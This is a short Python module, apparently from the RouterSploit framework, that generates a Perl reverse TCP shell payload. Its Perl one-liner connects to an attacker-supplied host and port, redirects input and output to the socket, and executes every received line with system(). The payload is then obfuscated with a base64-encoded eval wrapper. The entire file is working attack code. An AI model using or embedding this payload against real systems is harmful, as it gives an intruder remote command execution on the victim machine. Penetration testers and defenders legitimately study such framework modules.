from base64 import b64encode
from routersploit.core.exploit.payloads import GenericPayload, ReverseTCPPayloadMixin


class Exploit(ReverseTCPPayloadMixin, GenericPayload):
    __info__ = {
        "name": "Perl Reverse TCP",
        "description": "Creates interactive tcp reverse shell by using perl.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
    }

    def generate(self):
        payload = (
            "use IO;foreach my $key(keys %ENV){" +
            "if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\"" +
            self.lhost +
            ":" +
            str(self.lport) +
            "\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};"
        )

        encoded_payload = str(b64encode(bytes(payload, "utf-8")), "utf-8")
        return "use MIME::Base64;eval(decode_base64('{}'));".format(encoded_payload)
